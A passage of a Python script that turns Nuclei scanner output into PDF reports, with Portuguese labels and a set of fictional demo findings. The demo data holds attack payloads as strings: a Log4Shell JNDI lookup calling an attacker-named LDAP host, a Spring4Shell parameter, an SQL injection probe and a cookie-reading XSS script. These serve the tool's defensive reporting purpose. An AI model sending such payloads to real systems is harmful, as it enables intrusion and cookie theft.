    meta_cells = [
        [Paragraph(k, styles["label"]),
         Paragraph(safe(str(v), 220), styles["value"])]
        for k, v in meta
    ]
    meta_tbl = Table(meta_cells, colWidths=[3.2 * cm, usable_w - 3.2 * cm])
    meta_tbl.setStyle(TableStyle([
        ("ROWBACKGROUNDS", (0, 0), (-1, -1), [DARK_BG, PANEL_BG]),
        ("TOPPADDING",     (0, 0), (-1, -1), 3),
        ("BOTTOMPADDING",  (0, 0), (-1, -1), 3),
        ("LEFTPADDING",    (0, 0), (0, -1),  8),
        ("LEFTPADDING",    (1, 0), (1, -1),  6),
        ("LINEAFTER",      (0, 0), (0, -1),  0.5, BORDER_COLOR),
        ("LINEBELOW",      (0, 0), (-1, -1), 0.3, BORDER_COLOR),
    ]))
    story.append(meta_tbl)
    story.append(Spacer(1, 0.22 * cm))

    # ── Descrição ─────────────────────────────────────────────────────────────
    if finding["description"]:
        story.append(Paragraph("Descrição", styles["h3"]))
        story.append(Paragraph(safe(finding["description"]), styles["body"]))
        story.append(Spacer(1, 0.18 * cm))

    # ── Dados extraídos ───────────────────────────────────────────────────────
    if finding["extracted"]:
        story.append(Paragraph("Dados Extraídos pelo Matcher", styles["h3"]))
        for item in finding["extracted"][:10]:
            story.append(Paragraph(f"• {safe(str(item), 280)}", styles["body"]))
        story.append(Spacer(1, 0.18 * cm))

    # ── Request ───────────────────────────────────────────────────────────────
    if finding["request"]:
        story.append(Paragraph("Request HTTP", styles["h3"]))
        for el in _code_block(str(finding["request"]), styles, max_lines=45):
            story.append(el)
        story.append(Spacer(1, 0.18 * cm))

    # ── Response ──────────────────────────────────────────────────────────────
    if finding["response"]:
        story.append(Paragraph("Response HTTP", styles["h3"]))
        for el in _code_block(str(finding["response"]), styles, max_lines=55):
            story.append(el)
        story.append(Spacer(1, 0.18 * cm))

    # ── Remediação ────────────────────────────────────────────────────────────
    if finding["remediation"]:
        story.append(Paragraph("Remediação / Correção Recomendada", styles["h3"]))
        rem_tbl = Table(
            [[Paragraph(safe(finding["remediation"]), styles["body"])]],
            colWidths=[usable_w]
        )
        rem_tbl.setStyle(TableStyle([
            ("BACKGROUND",    (0, 0), (-1, -1), PANEL_BG),
            ("TOPPADDING",    (0, 0), (-1, -1), 7),
            ("BOTTOMPADDING", (0, 0), (-1, -1), 7),
            ("LEFTPADDING",   (0, 0), (-1, -1), 10),
            ("RIGHTPADDING",  (0, 0), (-1, -1), 10),
            ("LINEBEFORE",    (0, 0), (0, -1),  3, GREEN),
        ]))
        story.append(rem_tbl)
        story.append(Spacer(1, 0.18 * cm))

    # ── Referências ───────────────────────────────────────────────────────────
    if finding["references"]:
        story.append(Paragraph("Referências", styles["h3"]))
        for ref in finding["references"]:
            ref_str = str(ref).strip()
            if ref_str.startswith("http"):
                story.append(Paragraph(
                    f'• <a href="{ref_str}" color="{hex_color(ACCENT)}">'
                    f'{safe(ref_str, 100)}</a>',
                    styles["body"]))
            else:
                story.append(Paragraph(f"• {safe(ref_str, 120)}", styles["body"]))

    story.append(Spacer(1, 0.4 * cm))
    story.append(DividerLine(usable_w, color=BORDER_COLOR, thickness=0.35))
    story.append(Spacer(1, 0.45 * cm))


# ══════════════════════════════════════════════════════════════════════════════
#  Função principal
# ══════════════════════════════════════════════════════════════════════════════

def generate_report(findings_raw: list, output_path: str,
                    report_title: str = "",
                    target:       str = "",
                    author:       str = "") -> str:

    from reportlab.platypus import BaseDocTemplate, Frame, PageTemplate, NextPageTemplate

    findings = [normalize_finding(r) for r in findings_raw]
    order_map = {s: i for i, s in enumerate(SEVERITY_ORDER)}
    findings.sort(key=lambda f: order_map.get(f["severity"], 99))

    styles = make_styles()

    # Auto-detecta alvo
    if not target and findings:
        t = findings[0].get("host") or findings[0].get("matched_at", "")
        for sep in ["/", "?"]:
            if sep in t:
                t = t.split(sep)[0]
        target = t

    _title  = report_title or "Nuclei Vulnerability Report"
    _target = target
    _author = author
    _finds  = findings
    _date   = datetime.now().strftime("%d/%m/%Y %H:%M")

    # ── Callbacks onPage — pintam ANTES do conteúdo ───────────────────────────

    def _page_cover(canvas, doc):
        canvas.saveState()
        draw_executive_cover(canvas, doc, _title, _target, _author, _finds)
        canvas.restoreState()

    def _page_inner(canvas, doc):
        canvas.saveState()

        # Fundo preto
        canvas.setFillColor(DARK_BG)
        canvas.rect(0, 0, PAGE_W, PAGE_H, stroke=0, fill=1)

        # ── Header ──
        canvas.setFillColor(BLACK)
        canvas.rect(0, PAGE_H - 26, PAGE_W, 26, stroke=0, fill=1)
        canvas.setFillColor(ACCENT)
        canvas.rect(0, PAGE_H - 27, PAGE_W, 1, stroke=0, fill=1)

        canvas.setFont("Helvetica-Bold", 8.5)
        canvas.setFillColor(ACCENT)
        canvas.drawString(MARGIN, PAGE_H - 17, "NUCLEI SCANNER")

        canvas.setFont("Helvetica", 7.5)
        canvas.setFillColor(TEXT_MUTED)
        canvas.drawRightString(PAGE_W - MARGIN, PAGE_H - 17,
                               "Confidential — Security Assessment")

        # ── Footer ──
        canvas.setFillColor(BLACK)
        canvas.rect(0, 0, PAGE_W, 20, stroke=0, fill=1)
        canvas.setFillColor(ACCENT)
        canvas.rect(0, 20, PAGE_W, 0.5, stroke=0, fill=1)

        canvas.setFont("Helvetica", 6.5)
        canvas.setFillColor(TEXT_MUTED)

        left_txt = f"Gerado em {_date}"
        if _author:
            left_txt += f"  ·  Autor: {_author}"
        canvas.drawString(MARGIN, 6.5, left_txt)
        canvas.drawCentredString(PAGE_W / 2, 6.5, _title[:60])

        # Número de página (doc.page disponível no multiBuild)
        page_num = getattr(doc, "page", "?")
        total_pg = getattr(doc, "_pageCount", "?")
        canvas.drawRightString(PAGE_W - MARGIN, 6.5,
                               f"Página {page_num} de {total_pg}")

        canvas.restoreState()

    # ── Frames ────────────────────────────────────────────────────────────────

    # Capa: frame minúsculo no canto (nada de conteúdo entra, só o callback desenha)
    frame_cover = Frame(0, 0, PAGE_W, PAGE_H,
                        leftPadding=0, rightPadding=0,
                        topPadding=0, bottomPadding=0,
                        id="cover")

    # Inner: área útil dentro dos header/footer de 26 e 22 pt
    HEADER_H = 28
    FOOTER_H = 22
    frame_inner = Frame(
        MARGIN,
        FOOTER_H,
        PAGE_W - 2 * MARGIN,
        PAGE_H - HEADER_H - FOOTER_H,
        leftPadding=0, rightPadding=0,
        topPadding=6, bottomPadding=6,
        id="inner"
    )

    tpl_cover = PageTemplate(id="Cover", frames=[frame_cover], onPage=_page_cover)
    tpl_inner = PageTemplate(id="Inner", frames=[frame_inner], onPage=_page_inner)

    doc = BaseDocTemplate(
        output_path,
        pagesize=A4,
        pageTemplates=[tpl_cover, tpl_inner],
        title=_title,
        author=_author,
    )

    # ── Story ─────────────────────────────────────────────────────────────────

    story = []

    # Página 1: capa (frame vazio — conteúdo visual todo via _page_cover)
    story.append(NextPageTemplate("Inner"))
    story.append(PageBreak())

    # Sumário executivo
    build_executive_summary(story, styles, findings, report_title, target, author)

    # Índice
    build_index(story, styles, findings)

    # Detalhamento — cada finding começa no topo de uma nova página
    for i, f in enumerate(findings, 1):
        if i == 1:
            # build_index já emitiu PageBreak — só adiciona cabeçalho da seção
            story.append(Paragraph("Detalhamento dos Findings", styles["h1"]))
            story.append(AccentBar())
            story.append(Spacer(1, 0.4 * cm))
        else:
            story.append(PageBreak())
        build_finding(story, styles, f, i, len(findings))

    # multiBuild faz 2 passes: 1° conta páginas, 2° usa _pageCount no rodapé
    doc.multiBuild(story)
    return output_path



# ══════════════════════════════════════════════════════════════════════════════
#  Dados de demonstração
# ══════════════════════════════════════════════════════════════════════════════

DEMO_FINDINGS = [
    {
        "template-id": "CVE-2021-44228",
        "info": {
            "name": "Apache Log4j RCE (Log4Shell)",
            "severity": "critical",
            "description": (
                "Apache Log4j2 <=2.14.1 JNDI features used in configuration, "
                "log messages, or parameters do not protect against attacker "
                "controlled LDAP and other JNDI related endpoints. "
                "An attacker who can control log messages or log message parameters "
                "can execute arbitrary code loaded from LDAP servers."
            ),
            "remediation": (
                "Atualize o Apache Log4j para a versão 2.17.1 ou superior. "
                "Como mitigação imediata, defina a propriedade do sistema "
                "log4j2.formatMsgNoLookups=true ou remova a classe JndiLookup "
                "do classpath. Bloqueie chamadas LDAP de saída no firewall."
            ),
            "reference": [
                "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
                "https://logging.apache.org/log4j/2.x/security.html",
                "https://www.cisa.gov/uscert/apache-log4j-vulnerability-guidance",
            ],
            "classification": {
                "cve-id": ["CVE-2021-44228"],
                "cwe-id": ["CWE-502"],
                "cvss-score": 10.0,
            },
            "tags": ["cve", "log4j", "rce", "java", "oast", "critical"],
        },
        "matched-at": "https://app.empresa.com.br:8080/api/login",
        "host":        "https://app.empresa.com.br:8080",
        "ip":          "200.1.2.50",
        "type":        "http",
        "matcher-name": "dns",
        "timestamp":   "2024-06-15T14:22:01.000Z",
        "request": (
            "POST /api/login HTTP/1.1\r\n"
            "Host: app.empresa.com.br:8080\r\n"
            "Content-Type: application/json\r\n"
            "User-Agent: ${jndi:ldap://attacker.oast.fun/log4j}\r\n"
            "Content-Length: 52\r\n\r\n"
            '{"username":"${jndi:ldap://oast.fun/x}","password":"test"}'
        ),
        "response": (
            "HTTP/1.1 200 OK\r\n"
            "Content-Type: application/json\r\n"
            "X-Powered-By: Spring Boot 2.6.1\r\n"
            "X-Application-Context: application:8080\r\n\r\n"
            '{"status":"error","message":"Invalid credentials","code":401}'
        ),
        "extracted-results": ["DNS callback received from 200.1.2.50 (oast.fun)"],
    },
    {
        "template-id": "CVE-2022-22965",
        "info": {
            "name": "Spring4Shell — Spring Framework RCE",
            "severity": "critical",
            "description": (
                "Uma vulnerabilidade de execução remota de código existe no "
                "Spring Framework (5.3.x < 5.3.18, 5.2.x < 5.2.20) quando usado "
                "com JDK 9+ via DataBinder. O atacante pode gravar arquivos JSP "
                "maliciosos no servidor, obtendo execução de código remota."
            ),
            "remediation": "Atualize Spring Framework para 5.3.18+ ou 5.2.20+. Use JDK 8 como mitigação temporária.",
            "reference": [
                "https://nvd.nist.gov/vuln/detail/CVE-2022-22965",
                "https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement",
            ],
            "classification": {"cve-id": ["CVE-2022-22965"], "cvss-score": 9.8},
            "tags": ["cve", "spring", "rce", "java"],
        },
        "matched-at": "https://app.empresa.com.br:8080/spring/upload",
        "host":        "https://app.empresa.com.br:8080",
        "ip":          "200.1.2.50",
        "type":        "http",
        "timestamp":   "2024-06-15T14:23:10.000Z",
        "request": (
            "GET /spring/upload?class.module.classLoader.resources.context"
            ".parent.pipeline.first.pattern=%25%7Bc2%7Di HTTP/1.1\r\n"
            "Host: app.empresa.com.br:8080\r\n"
            "Connection: close\r\n\r\n"
        ),
        "response": (
            "HTTP/1.1 400 Bad Request\r\n"
            "Content-Type: text/html;charset=UTF-8\r\n\r\n"
            "<html><body><h1>Whitelabel Error Page</h1>"
            "<p>This application has no explicit mapping for /error</p></body></html>"
        ),
    },
    {
        "template-id": "sqli-error-based",
        "info": {
            "name": "SQL Injection — Error Based",
            "severity": "high",
            "description": (
                "Parâmetro de busca vulnerável a injeção SQL baseada em erro. "
                "Mensagens de erro do MySQL são refletidas na resposta, "
                "permitindo extração de dados do banco via técnica de error-based."
            ),
            "remediation": (
                "Use prepared statements (consultas parametrizadas) em todas as queries. "
                "Nunca concatene input do usuário em strings SQL. "
                "Implemente validação de input server-side e configure uma WAF. "
                "Desative mensagens de erro detalhadas em produção."
            ),
            "reference": [
                "https://owasp.org/www-community/attacks/SQL_Injection",
                "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
                "https://portswigger.net/web-security/sql-injection",
            ],
            "classification": {"cwe-id": ["CWE-89"], "cvss-score": 8.8},
            "tags": ["sqli", "injection", "owasp-top10", "database"],
        },
        "matched-at": "https://app.empresa.com.br/busca?q=produto",
        "host":        "https://app.empresa.com.br",
        "ip":          "200.1.2.50",
        "type":        "http",
        "matcher-name": "word",
        "timestamp":   "2024-06-15T14:25:00.000Z",
        "request": (
            "GET /busca?q=produto' HTTP/1.1\r\n"
            "Host: app.empresa.com.br\r\n"
            "Cookie: PHPSESSID=abc123xyz; logged_in=1\r\n"
            "User-Agent: Mozilla/5.0\r\n\r\n"
        ),
        "response": (
            "HTTP/1.1 500 Internal Server Error\r\n"
            "Content-Type: text/html; charset=utf-8\r\n\r\n"
            "You have an error in your SQL syntax; check the manual that "
            "corresponds to your MySQL server version for the right syntax "
            "to use near ''produto''' at line 1\n"
            "Query: SELECT * FROM produtos WHERE nome = 'produto''"
        ),
        "extracted-results": ["MySQL 8.0.28-commercial", "error-based injection confirmed"],
    },
    {
        "template-id": "xss-reflected",
        "info": {
            "name": "Cross-Site Scripting (XSS) Refletido",
            "severity": "medium",
            "description": (
                "O parâmetro 'q' reflete input não sanitizado diretamente no HTML "
                "da resposta, permitindo injeção e execução de scripts maliciosos "
                "no contexto do navegador da vítima."
            ),
            "remediation": (
                "Encode todo output HTML usando funções como htmlspecialchars() (PHP) "
                "ou equivalente. Implemente Content Security Policy (CSP). "
                "Utilize bibliotecas como DOMPurify para sanitização client-side. "
                "Defina o atributo HttpOnly nos cookies de sessão."
            ),
            "reference": [
                "https://owasp.org/www-community/attacks/xss/",
                "https://portswigger.net/web-security/cross-site-scripting",
                "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
            ],
            "classification": {"cwe-id": ["CWE-79"], "cvss-score": 6.1},
            "tags": ["xss", "owasp-top10", "client-side"],
        },
        "matched-at": "https://app.empresa.com.br/busca?q=<script>alert(1)</script>",
        "host":        "https://app.empresa.com.br",
        "ip":          "200.1.2.50",
        "type":        "http",
        "timestamp":   "2024-06-15T14:26:30.000Z",
        "request": (
            "GET /busca?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E HTTP/1.1\r\n"
            "Host: app.empresa.com.br\r\n"
            "User-Agent: Mozilla/5.0\r\n\r\n"
        ),
        "response": (
            "HTTP/1.1 200 OK\r\n"
            "Content-Type: text/html; charset=utf-8\r\n\r\n"
            "<html><head><title>Busca</title></head><body>\r\n"
            "<h2>Resultados para: <script>alert(document.cookie)</script></h2>\r\n"
            "<p>Nenhum resultado encontrado.</p></body></html>"
        ),
        "extracted-results": ["<script>alert(document.cookie)</script> reflected in body"],
    },
    {
        "template-id": "exposed-git-repo",
        "info": {
            "name": "Git Repository Exposto Publicamente",
            "severity": "low",
            "description": (
                "O diretório .git está acessível publicamente via HTTP. "
                "Isso permite que atacantes reconstruam o código-fonte da aplicação, "
                "exponham credenciais hardcoded, tokens e histórico de commits."
            ),
            "remediation": (
                "Bloqueie o acesso ao diretório .git via configuração do servidor web. "
                "No Nginx: deny all para location ~ /\\.git. "
                "No Apache: use Require all denied no .htaccess."
            ),
            "reference": ["https://owasp.org/www-project-web-security-testing-guide/"],
            "tags": ["git", "exposure", "misconfiguration", "source-code"],
        },
        "matched-at": "https://app.empresa.com.br/.git/HEAD",
        "host":        "https://app.empresa.com.br",
        "ip":          "200.1.2.50",
        "type":        "http",
        "timestamp":   "2024-06-15T14:27:00.000Z",
        "request": (
            "GET /.git/HEAD HTTP/1.1\r\n"
            "Host: app.empresa.com.br\r\n"
            "User-Agent: Mozilla/5.0\r\n\r\n"
        ),
        "response": (
            "HTTP/1.1 200 OK\r\n"
            "Content-Type: text/plain\r\n\r\n"
            "ref: refs/heads/main"
        ),
        "extracted-results": ["ref: refs/heads/main"],
    },
    {
        "template-id": "tech-detect-nginx",
        "info": {
            "name": "Nginx — Versão Divulgada no Header",
            "severity": "info",
            "description": "O servidor revela a versão exata do Nginx no header 'Server', facilitando fingerprinting.",
            "remediation": "Adicione 'server_tokens off;' no bloco http{} do nginx.conf e recarregue o serviço.",
            "reference": ["https://nginx.org/en/docs/http/ngx_http_core_module.html#server_tokens"],
            "tags": ["tech", "nginx", "disclosure", "fingerprint"],
        },
        "matched-at": "https://app.empresa.com.br/",
        "host":        "https://app.empresa.com.br",
        "ip":          "200.1.2.50",
        "type":        "http",
        "timestamp":   "2024-06-15T14:20:00.000Z",
        "request":  "GET / HTTP/1.1\r\nHost: app.empresa.com.br\r\n\r\n",
        "response": (
            "HTTP/1.1 200 OK\r\n"
            "Server: nginx/1.18.0 (Ubuntu)\r\n"
            "Content-Type: text/html\r\n\r\n"
            "<html><body><h1>Welcome</h1></body></html>"
        ),
        "extracted-results": ["nginx/1.18.0"],
    },
]


# ══════════════════════════════════════════════════════════════════════════════
#  CLI
# ══════════════════════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description="Gera relatório PDF profissional a partir de resultados do Nuclei.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemplos:
  # Scan real
  nuclei -u https://alvo.com -jsonl -o results.jsonl
  python nuclei_report.py -i results.jsonl -o report.pdf --author "Red Team" --title "Pentest Q2"

  # Demo (dados fictícios)
  python nuclei_report.py --demo
  python nuclei_report.py --demo --author "João Silva" --title "Avaliação de Segurança"
        """
    )
    parser.add_argument("-i", "--input",  help="Arquivo de resultados Nuclei (JSONL ou JSON)")
    parser.add_argument("-o", "--output", help="PDF de saída", default="nuclei_report.pdf")
    parser.add_argument("--title",        help="Título do relatório", default="")
    parser.add_argument("--target",       help="URL/nome do alvo (exibido na capa)", default="")
    parser.add_argument("--author",       help="Nome do analista / autor do relatório", default="")
    parser.add_argument("--demo",         action="store_true",
                        help="Gera relatório de demonstração com dados fictícios")
    args = parser.parse_args()

    if args.demo:
        out = args.output if args.output != "nuclei_report.pdf" else "nuclei_report_demo.pdf"
        print(f"[*] Gerando relatório demo → {out}")
        generate_report(
            DEMO_FINDINGS, out,
            report_title=args.title  or "Relatório de Avaliação de Segurança",
            target=args.target       or "app.empresa.com.br",
            author=args.author       or "Red Team — Security Assessment",
        )
        print(f"[+] Relatório gerado: {out}")
        return

    if not args.input:
        parser.error("Informe --input ou use --demo")
    if not os.path.exists(args.input):
        print(f"[!] Arquivo não encontrado: {args.input}", file=sys.stderr)
        sys.exit(1)

    print(f"[*] Lendo: {args.input}")
    raw = parse_nuclei_jsonl(args.input)
    print(f"[*] Findings carregados: {len(raw)}")
    generate_report(raw, args.output,
                    report_title=args.title,
                    target=args.target,
                    author=args.author)
    print(f"[+] Relatório gerado: {args.output}")


if __name__ == "__main__":
    main()
